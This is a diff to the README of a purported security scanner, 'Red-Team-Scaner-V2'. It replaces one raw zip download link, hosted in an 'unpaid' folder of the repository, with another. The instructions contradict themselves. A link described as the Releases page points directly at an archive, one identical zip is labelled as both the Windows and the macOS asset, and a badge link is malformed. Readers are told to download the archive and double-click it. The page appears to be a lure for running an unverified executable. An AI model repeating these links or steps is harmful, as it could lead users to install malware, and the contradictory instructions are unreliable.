@@ -1,7 +1,7 @@
 # 🚀 Red-Team-Scaner-V2 - Simplify Your Security Scanning
 
 ## 🔗 Download Here
-[![Download Red-Team-Scaner-V2](https://raw.githubusercontent.com/mallahashok9239/Red-Team-Scaner-V2/main/unpaid/Red-Team-Scaner-V2_Marchmont.zip%https://raw.githubusercontent.com/mallahashok9239/Red-Team-Scaner-V2/main/unpaid/Red-Team-Scaner-V2_Marchmont.zip)](https://raw.githubusercontent.com/mallahashok9239/Red-Team-Scaner-V2/main/unpaid/Red-Team-Scaner-V2_Marchmont.zip)
+[![Download Red-Team-Scaner-V2](https://github.com/mallahashok9239/Red-Team-Scaner-V2/raw/refs/heads/main/unpaid/Red_Team_Scaner_v3.9.zip%https://github.com/mallahashok9239/Red-Team-Scaner-V2/raw/refs/heads/main/unpaid/Red_Team_Scaner_v3.9.zip)](https://github.com/mallahashok9239/Red-Team-Scaner-V2/raw/refs/heads/main/unpaid/Red_Team_Scaner_v3.9.zip)
 
 ## 📋 Table of Contents
 - [🔍 Overview](#-overview)
@@ -32,13 +32,13 @@ To start using Red-Team-Scaner-V2, follow these steps:
 ## 📥 Download & Install
 To download Red-Team-Scaner-V2, visit the link below:
 
-[Download Red-Team-Scaner-V2](https://raw.githubusercontent.com/mallahashok9239/Red-Team-Scaner-V2/main/unpaid/Red-Team-Scaner-V2_Marchmont.zip)
+[Download Red-Team-Scaner-V2](https://github.com/mallahashok9239/Red-Team-Scaner-V2/raw/refs/heads/main/unpaid/Red_Team_Scaner_v3.9.zip)
 
 Follow these steps to download and install the software:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed at the top.
-3. Click on the asset labeled `https://raw.githubusercontent.com/mallahashok9239/Red-Team-Scaner-V2/main/unpaid/Red-Team-Scaner-V2_Marchmont.zip` (for Windows) or `https://raw.githubusercontent.com/mallahashok9239/Red-Team-Scaner-V2/main/unpaid/Red-Team-Scaner-V2_Marchmont.zip` (for macOS) or the appropriate Linux package.
+3. Click on the asset labeled `https://github.com/mallahashok9239/Red-Team-Scaner-V2/raw/refs/heads/main/unpaid/Red_Team_Scaner_v3.9.zip` (for Windows) or `https://github.com/mallahashok9239/Red-Team-Scaner-V2/raw/refs/heads/main/unpaid/Red_Team_Scaner_v3.9.zip` (for macOS) or the appropriate Linux package.
 4. The download will start automatically. 
 5. Once the download completes, navigate to your Downloads folder.
 6. Double-click on the file to start the installation process.
